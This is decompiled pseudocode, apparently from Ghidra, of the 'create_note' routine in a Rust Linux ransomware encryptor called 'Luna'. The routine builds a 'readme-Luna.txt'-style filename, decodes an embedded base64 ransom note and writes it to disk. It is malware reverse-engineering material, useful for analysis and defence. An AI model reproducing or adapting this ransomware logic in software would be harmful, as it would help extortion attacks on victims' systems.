/* WARNING: Function: __rust_probestack replaced with injection: __rust_probestack */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void _ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E(undefined8 param_1)

{
  byte bVar1;
  code *pcVar2;
  undefined **ppuVar3;
  char *pcVar4;
  long lVar5;
  uint uVar6;
  uint uVar7;
  undefined **local_10f0;
  long lStack_10e8;
  long local_10e0;
  char *local_10d0;
  undefined8 local_10c8;
  long local_10b8;
  long local_10b0;
  undefined8 uStack_10a8;
  long local_10a0;
  undefined4 local_1090;
  undefined4 uStack_108c;
  undefined4 uStack_1088;
  undefined4 uStack_1084;
  long local_1080;
  undefined **local_1078;
  long lStack_1070;
  long local_1068;
  undefined8 local_1060;
  undefined8 uStack_1058;
  ulong local_1050;
  undefined8 uStack_1048;
  undefined8 local_1040;
  undefined8 uStack_1038;
  undefined local_1030 [4096];
  undefined2 local_30;
  undefined8 uStack_28;
  
  uStack_28 = 0x10b731;
  (*(code *)PTR_clone_00177740)(&local_1060,param_1);
  if (uStack_1058 - local_1050 < 7) {
                    /* try { // try from 0010b75e to 0010b772 has its CatchHandler @ 0010bc84 */
    _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
              (&local_1060,local_1050,7);
  }
  *(uint *)((long)local_1060 + local_1050 + 3) = CONCAT31(s_dme__00153353._1_3_,s_dme__00153353[0]);
  *(undefined4 *)((long)local_1060 + local_1050) = _s_rea_00153350;
  local_10e0 = local_1050 + 7;
  local_10f0 = (undefined **)local_1060;
  lStack_10e8 = uStack_1058;
                    /* try { // try from 0010b7ab to 0010b7c4 has its CatchHandler @ 0010bcc6 */
  (*(code *)PTR_from_utf8_00177ae8)(&local_1060,"Luna",4);
  if ((undefined **)local_1060 != (undefined **)0x0) {
    local_10b0 = uStack_1058;
                    /* try { // try from 0010bc18 to 0010bc3c has its CatchHandler @ 0010bcc6 */
    (*(code *)PTR_unwrap_failed_00177f80)
              ("called `Result::unwrap()` on an `Err` value",0x2b,&local_10b0,
               &
               PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173eb0
               ,&PTR_s_src_files_rs_00174120);
    goto LAB_0010bc7e;
  }
  if ((ulong)(lStack_10e8 - local_10e0) < local_1050) {
                    /* try { // try from 0010b7f6 to 0010b806 has its CatchHandler @ 0010bc82 */
    _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
              (&local_10f0,local_10e0,local_1050);
  }
  lVar5 = local_10e0;
  (*(code *)PTR_memcpy_00177fa8)((char *)((long)local_10f0 + local_10e0),uStack_1058,local_1050);
  local_1050 = lVar5 + local_1050;
  local_1060 = (char *)local_10f0;
  uStack_1058 = lStack_10e8;
  if (lStack_10e8 - local_1050 < 4) {
                    /* try { // try from 0010b847 to 0010b85e has its CatchHandler @ 0010bc80 */
    _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
              (&local_1060,local_1050,4);
  }
  builtin_strncpy((char *)((long)local_1060 + local_1050),".txt",4);
  local_1080 = local_1050 + 4;
  local_1090 = (undefined4)local_1060;
  uStack_108c = local_1060._4_4_;
  uStack_1088 = (undefined4)uStack_1058;
  uStack_1084 = uStack_1058._4_4_;
  pcVar4 = "W";
  lVar5 = 0x2ea;
  do {
    if (pcVar4 == "Error while writing note\n") goto LAB_0010bbf0;
    bVar1 = *pcVar4;
    if ((char)bVar1 < '\0') {
      if (bVar1 < 0xe0) {
        pcVar4 = (char *)((byte *)pcVar4 + 2);
      }
      else if (bVar1 < 0xf0) {
        pcVar4 = (char *)((byte *)pcVar4 + 3);
      }
      else {
        if ((((byte *)pcVar4)[3] & 0x3f |
             (((byte *)pcVar4)[2] & 0x3f) << 6 | (((byte *)pcVar4)[1] & 0x3f) << 0xc |
            (bVar1 & 7) << 0x12) == 0x110000) goto LAB_0010bbf0;
        pcVar4 = (char *)((byte *)pcVar4 + 4);
      }
    }
    else {
      pcVar4 = (char *)((byte *)pcVar4 + 1);
    }
    lVar5 = lVar5 + -1;
  } while (lVar5 != 0);
  if (pcVar4 == "Error while writing note\n") {
LAB_0010bbf0:
                    /* try { // try from 0010bbf0 to 0010bc08 has its CatchHandler @ 0010bcce */
    (*(code *)PTR_panic_00177a90)
              ("called `Option::unwrap()` on a `None` value",0x2b,&PTR_s_src_files_rs_001740f0);
    goto LAB_0010bc7e;
  }
  bVar1 = *pcVar4;
  uVar7 = (uint)bVar1;
  if ((char)bVar1 < '\0') {
    uVar6 = bVar1 & 0x1f;
    if (bVar1 < 0xe0) {
      uVar7 = uVar6 << 6 | ((byte *)pcVar4)[1] & 0x3f;
    }
    else {
      uVar7 = ((byte *)pcVar4)[2] & 0x3f | (((byte *)pcVar4)[1] & 0x3f) << 6;
      if (bVar1 < 0xf0) {
        uVar7 = uVar7 | uVar6 << 0xc;
      }
      else {
        uVar7 = ((byte *)pcVar4)[3] & 0x3f | uVar7 << 6 | (bVar1 & 7) << 0x12;
        if (uVar7 == 0x110000) goto LAB_0010bbf0;
      }
    }
  }
  lVar5 = 0x22f;
  if (uVar7 == 0x3d) {
    pcVar4 = "W";
    lVar5 = 0x2e9;
    do {
      if (pcVar4 == "Error while writing note\n") goto LAB_0010ba53;
      bVar1 = *pcVar4;
      if ((char)bVar1 < '\0') {
        if (bVar1 < 0xe0) {
          pcVar4 = (char *)((byte *)pcVar4 + 2);
        }
        else if (bVar1 < 0xf0) {
          pcVar4 = (char *)((byte *)pcVar4 + 3);
        }
        else {
          if ((((byte *)pcVar4)[3] & 0x3f |
               (((byte *)pcVar4)[2] & 0x3f) << 6 | (((byte *)pcVar4)[1] & 0x3f) << 0xc |
              (bVar1 & 7) << 0x12) == 0x110000) goto LAB_0010ba53;
          pcVar4 = (char *)((byte *)pcVar4 + 4);
        }
      }
      else {
        pcVar4 = (char *)((byte *)pcVar4 + 1);
      }
      lVar5 = lVar5 + -1;
    } while (lVar5 != 0);
    if (pcVar4 == "Error while writing note\n") {
LAB_0010ba53:
                    /* try { // try from 0010ba53 to 0010ba6b has its CatchHandler @ 0010bcce */
      (*(code *)PTR_panic_00177a90)
                ("called `Option::unwrap()` on a `None` value",0x2b,&PTR_s_src_files_rs_00174108);
      goto LAB_0010bc7e;
    }
    bVar1 = *pcVar4;
    uVar7 = (uint)bVar1;
    if ((char)bVar1 < '\0') {
      uVar6 = bVar1 & 0x1f;
      if (bVar1 < 0xe0) {
        uVar7 = uVar6 << 6 | ((byte *)pcVar4)[1] & 0x3f;
      }
      else {
        uVar7 = ((byte *)pcVar4)[2] & 0x3f | (((byte *)pcVar4)[1] & 0x3f) << 6;
        if (bVar1 < 0xf0) {
          uVar7 = uVar7 | uVar6 << 0xc;
        }
        else {
          uVar7 = ((byte *)pcVar4)[3] & 0x3f | uVar7 << 6 | (bVar1 & 7) << 0x12;
          if (uVar7 == 0x110000) goto LAB_0010ba53;
        }
      }
    }
    lVar5 = 0x22e - (ulong)(uVar7 == 0x3d);
  }
  ppuVar3 = (undefined **)(*(code *)PTR___rust_alloc_zeroed_00177a08)(lVar5,1);
  if (ppuVar3 == (undefined **)0x0) {
                    /* try { // try from 0010bc3f to 0010bc4c has its CatchHandler @ 0010bcce */
    (*(code *)PTR_handle_alloc_error_00177ae0)(lVar5,1);
  }
  else {
    local_1078 = ppuVar3;
    lStack_1070 = lVar5;
    local_1068 = lVar5;
    (*(code *)PTR_memset_00177770)(local_1030,0,0x1000);
    local_1060 = "W";
    uStack_1058 = 0x2eb;
    local_30 = 0;
    local_1050 = 0;
    uStack_1048 = 0;
    local_1040 = 0;
    uStack_1038 = 0;
                    /* try { // try from 0010bb3a to 0010bb4f has its CatchHandler @ 0010bcb7 */
    _ZN98__LT_base64_stream__from_base64_reader__FromBase64Reader_LT_R_C_N_GT__u20_as_u20_std__io__Read_GT_4read17hb3c702596d042c13E
              (&local_10f0,&local_1060,ppuVar3,lVar5);
    if (local_10f0 == (undefined **)0x0) {
      local_10a0 = local_1080;
      local_10b0 = CONCAT44(uStack_108c,local_1090);
      uStack_10a8 = CONCAT44(uStack_1084,uStack_1088);
      local_10e0 = local_1068;
      local_10f0 = local_1078;
      lStack_10e8 = lStack_1070;
      local_10b8 = _ZN3std2fs5write17h5120bf2973c52f89E(&local_10b0,&local_10f0);
      if (local_10b8 != 0) {
        local_10f0 = &PTR_s_Error_while_writing_note_00174150;
        lStack_10e8 = 1;
        local_10e0 = 0;
        local_10d0 = 
        "/rustc/fe5b13d681f25ee6474be29d748c65adcd91f69e/library/core/src/str/pattern.rs";
        local_10c8 = 0;
                    /* try { // try from 0010bbce to 0010bbd6 has its CatchHandler @ 0010bc89 */
        (*(code *)PTR__print_00177f40)(&local_10f0);
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&local_10b8);
      }
      return;
    }
    local_10b0 = lStack_10e8;
                    /* try { // try from 0010bc59 to 0010bc7d has its CatchHandler @ 0010bca0 */
    (*(code *)PTR_unwrap_failed_00177f80)
              ("called `Result::unwrap()` on an `Err` value",0x2b,&local_10b0,
               &
               PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
               ,&PTR_s_src_files_rs_00174138);
  }
LAB_0010bc7e:
                    /* WARNING: Does not return */
  pcVar2 = (code *)invalidInstructionException();
  (*pcVar2)();
}